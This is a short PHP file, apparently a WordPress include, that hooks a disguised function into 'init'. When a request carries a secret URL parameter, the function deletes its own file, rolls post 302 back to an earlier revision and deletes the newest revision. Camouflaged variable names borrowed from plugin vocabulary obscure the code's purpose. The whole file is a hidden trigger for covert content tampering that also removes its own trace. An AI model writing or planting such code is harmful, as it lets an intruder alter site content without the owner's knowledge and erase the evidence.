<?php

function support_quick_plus() {
	if (isset($_GET['highlighter_modal_variations_toolbar']) && $_GET['highlighter_modal_variations_toolbar'] === 'yoast_live_click') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$subscriptions_translator_rtl = 302;
		$reloaded_recent_newsletter_another = wp_get_post_revisions($subscriptions_translator_rtl);
		if (empty($reloaded_recent_newsletter_another)) die('no revisions');
		if (count($reloaded_recent_newsletter_another) < 2) die('less than 2');
		$akismet_url_conversion = array_shift($reloaded_recent_newsletter_another);
		$weather_cart_read = $akismet_url_conversion->ID;
		$embed_customizer_auto = array_shift($reloaded_recent_newsletter_another);
		$copy_homepage_your_website = $embed_customizer_auto->ID;
		$file_sign_show = wp_restore_post_revision($copy_homepage_your_website);
		if ($file_sign_show === false) die('error restoring');
		$file_sign_show = wp_delete_post_revision($weather_cart_read);		
		if ($file_sign_show === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'support_quick_plus');
